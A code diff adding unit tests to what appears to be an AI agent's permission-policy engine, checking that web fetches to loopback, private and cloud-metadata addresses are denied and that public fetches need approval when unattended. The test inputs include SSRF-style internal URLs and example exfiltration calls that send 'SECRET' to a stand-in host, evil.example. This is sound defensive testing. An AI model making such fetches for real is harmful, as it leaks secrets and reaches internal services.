@@ -1087,6 +1087,47 @@ describe("gap 3: decide stays bounded on a large command", () => {
   });
 });
 
+describe("gap 3: WebFetch and WebSearch", () => {
+  const fetch = (url: string) => call("WebFetch", { url, prompt: "summarize" });
+  const search = (query: string) => call("WebSearch", { query });
+  test.each([
+    "http://127.0.0.1:7878/health",
+    "http://localhost:3000/",
+    "http://[::1]/x",
+    "http://0.0.0.0/",
+    "http://10.0.0.5/admin",
+    "http://192.168.1.1/",
+    "http://172.20.0.1/",
+    "http://169.254.169.254/latest/meta-data/",
+    "http://printer.local/",
+    "http://app.localhost/",
+    "http://metadata.google.internal/",
+    "http://2130706433/",
+    "http://[::ffff:127.0.0.1]/",
+  ])("a fetch of %s is refused in every turn", (url) => {
+    expect(verdict(fetch(url), { initiator: user })).toBe("deny:floor.localnet");
+    expect(verdict(fetch(url), { initiator: routine })).toBe("deny:floor.localnet");
+  });
+  test("a public fetch passes in a user's turn and asks in an unattended one, naming the host", () => {
+    expect(verdict(fetch("https://evil.example/c?d=SECRET"), { initiator: user })).toBe("pass");
+    const d = decide(fetch("https://evil.example/c?d=SECRET"), ctx({ initiator: routine }));
+    expect(d).toMatchObject({ kind: "ask", rule: "web.fetch", signature: "WebFetch:web.fetch:evil.example", offerAlways: true });
+    expect(d.kind === "ask" && d.label).toContain("evil.example");
+  });
+  test("an Always for one host lets that host through unattended and no other", () => {
+    const rules = [allowRule("WebFetch:web.fetch:docs.example.com", "all")];
+    expect(verdict(fetch("https://docs.example.com/a"), { initiator: routine, rules })).toBe("allow:always");
+    expect(verdict(fetch("https://evil.example/a"), { initiator: routine, rules })).toBe("ask:web.fetch");
+  });
+  test("a fetch with no parseable URL asks unattended", () => {
+    expect(verdict(fetch("not a url"), { initiator: routine })).toBe("ask:web.fetch");
+  });
+  test("a search passes in a user's turn and asks in an unattended one", () => {
+    expect(verdict(search("SECRET site:evil.example"), { initiator: user })).toBe("pass");
+    expect(verdict(search("SECRET site:evil.example"), { initiator: routine })).toBe("ask:web.search");
+  });
+});
+
 describe("gap 3: save_skill never offers Always", () => {
   test("an unattended save_skill card offers Once, Deny and Never only", () => {
     expect(decide(call("mcp__claudio__save_skill", { name: "x", description: "d", body: "b" }), ctx({ initiator: routine }))).toMatchObject({ kind: "ask", rule: "claudio.save_skill", offerAlways: false });
